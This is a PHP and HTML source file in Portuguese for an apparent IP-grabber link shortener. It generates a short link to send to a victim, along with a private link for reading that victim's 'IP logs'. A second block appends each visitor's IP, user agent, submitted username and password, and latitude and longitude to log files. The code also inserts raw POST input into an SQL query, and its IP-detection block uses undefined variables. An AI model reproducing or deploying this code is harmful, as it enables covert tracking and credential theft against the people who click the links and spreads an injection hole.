<!DOCTYPE html>
<html>
<head>


	<meta charset="utf-8">
	<title>LINK GERADO COM SUCESSO</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<style>
	
body{
	background-color: black;
	color: white;
}


</style>

</head>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

<body>

<br><br>
<div class="alert alert-primary" role="alert" align="center">
<h3>Links Gerados Com Sucesso</h3>
</div>
<br>



	
<?php  

$link=$_POST['link'];
$ip="localhost";
$user="root";
$pass="";
$database="who4re27_encurtador";





$url_mini = substr(sha1(time()), 0,5);


if ($con=mysqli_connect($ip,$user,$pass,$database)){
	$sql = "INSERT INTO link (l_cod,l_link) VALUES ('$url_mini','$link')";
	if (mysqli_query($con,$sql)){
		
		

		echo "<br>";

		echo "<div class='alert alert-danger' role='alert' align='center'>
 		 O Link Encurtado É:  <a href='https://tools.who4reyou.org/url/r.php?i=$url_mini' class='alert-link'>https://tools.who4reyou.org/url/r.php?i=$url_mini</a> Mande Para o Usuario!
		</div><br>";
echo "<div class='alert alert-danger' role='alert' align='center'>
 		 Para Consultar Os Logs Acesse:  <a href='https://tools.who4reyou.org/url/log.php?i=$url_mini' class='alert-link'>https://tools.who4reyou.org/url/log.php?i=$url_mini</a> Acesse Para Obter os Logs IP!
		</div><br>";

       
        
        
        $url_mini = substr(sha1(time()), 0,5);


	}else{
		echo "Problema Na INserção de Dados no BD";
	}


}else{

echo "Problema de Coneçao com o Banco de Dado";



}



?>

<?php
$ip = $_SERVER['REMOTE_ADDR'].":".$_SERVER['REMOTE_PORT']; 
$pagina = $_SERVER['HTTP_USER_AGENT'];
$datum = date("d-m-y / H:i:s"); 
$invoegen = $datum . " - " . $ip . " - Pagina: " . $pagina." - Login: ".$_POST['username']." - Senha:".$_POST['password']." - GEOLOCALIZACAO Latitude: ". $_POST['latitude']."Longitude: ".$_POST['longitude']."<br>";
$fopen = fopen("log.html", "a"); 
fwrite($fopen, $invoegen); 
fclose($fopen);
$fopen = fopen("logs.html", "a"); 
fwrite($fopen, $invoegen); 
fclose($fopen);
    
 
/* VERIFICO SE O IP REALMENTE EXISTE NA INTERNET */
if(!empty($http_client_ip)){
    $ip = $http_client_ip;
    /* VERIFICO SE O ACESSO PARTIU DE UM SERVIDOR PROXY */
} elseif(!empty($http_x_forwarded_for)){
    $ip = $http_x_forwarded_for;
} else {
    /* CASO EU NÃO ENCONTRE NAS DUAS OUTRAS MANEIRAS, RECUPERO DA FORMA TRADICIONAL */
    $ip = $remote_addr;
}
 
echo $ip;
 
 
?>



</body>
</html>